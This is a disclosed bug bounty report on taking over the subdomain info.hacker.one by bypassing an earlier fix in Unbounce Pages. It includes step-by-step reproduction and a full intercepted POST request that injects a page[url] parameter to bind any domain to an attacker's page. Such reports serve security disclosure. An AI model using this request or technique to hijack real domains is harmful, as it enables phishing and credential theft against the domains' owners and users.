# Subdomain takeover #4 at info.hacker.one

## Report Details
- **Report ID**: 220002
- **URL**: https://hackerone.com/reports/220002
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-04-10T17:53:38.332Z
- **Disclosed**: 2017-06-21T04:09:52.822Z

## Reporter
- **Username**: ak1t4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

Hi team, looking the last fix released from unbounce team at https://hackerone.com/reports/217358 i've been able to bypass it and takeover the subdomain info.hacker.one with a new vulnerable **ENDPOINT + PARAM COMBINATION** at UnbouncePages App

**Actual Dns Entry:**
{F174718}


### Reproduction Steps for HackerOne

1) I have claimed the domain and placed a new-page for PoC validation located under: 
Go to -> http://info.hacker.one/testing-new-takeover-04-10-17/
2) You see the alert box and the New Subdomain Takeover
{F174729}


**[ Unbounce Pages Team Section ]**

### Reproduction Steps PoC at new PARAM-ENPOINT COMBINATION

1) Login to account
2) Create a New Page under any domain or default domain (unbouncepages.com)
3) Go to "Change URL"
4) Fill with any input 
5) Intercept Request with burp or another proxy
6) Change Enpoint to ->  ```/[account-id]/pages/[page-id]/url ```
7) Add this param at the end of body ->  ``` &page%5Burl%5D=info.hacker.one/testing-new-takeover-04-10-17 ```

POST REQUEST

``` 
POST /2235922/pages/4d2a5d74-2119-4c68-8d93-f456566f2fe8/url/   HTTP/1.1
Host: app.unbounce.com
Connection: close
Content-Length: 186
X-NewRelic-ID: XQQAUl9ADAQFV1hW
Origin: https://app.unbounce.com
X-CSRF-Token: 7fHXoRIVY2kDTQxt+k6jjNgJagryJHBfu7MuZLtB7V4=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
X-Requested-With: XMLHttpRequest
Referer: https://app.unbounce.com/2235922/pages/4d2a5d74-2119-4c68-8d93-f456566f2fe8
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.8,fi;q=0.6,en;q=0.4
Cookie: ...

utf8=%E2%9C%93&_method=put&authenticity_token=7fHXoRIVY2kDTQxt%2Bk6jjNgJagryJHBfu7MuZLtB7V4%3D&page%5Bdomain%5D=unbouncepages.com&page%5Bpath%5D=testing-new-takeover-bypass-akita&button=&page%5Burl%5D=info.hacker.one/testing-new-takeover-04-10-17

``` 

**Vulnerable Endpoint: /[account-id]/pages/[page-id]/url**
**Vulnerable Injected PARAM: page%5Burl%5D=anydomain.com**

**This Request update the page with the New Domain (any domain could be used and creating content into it)**

I create a New Private Video PoC here for the above explained -> https://youtu.be/HKYMYkDDYW8

**(All branded domains under unbounce app are vulnerable)**

### Security Impact at H1:

*An attacker can utilize this domain info.hacker.one for targeting the organization by fake login hackerOne forms, or steal sensitive information of teams (credentials, credit card information, etc)

### Security impact at Unbounce Pages:

*An attacker can utilize this bug affecting all branded domains and customers at unbouncepages.com
and use all domains with evil purposes as stealing of sensitive information, credentials, credit card info, etc

Please let me know if more info needed or any help,

Best Regards,
@ak1t4

## Attachments
- Captura_de_pantalla_2017-04-10_a_las_14.06.37.png
- Captura_de_pantalla_2017-04-10_a_las_14.29.27.png
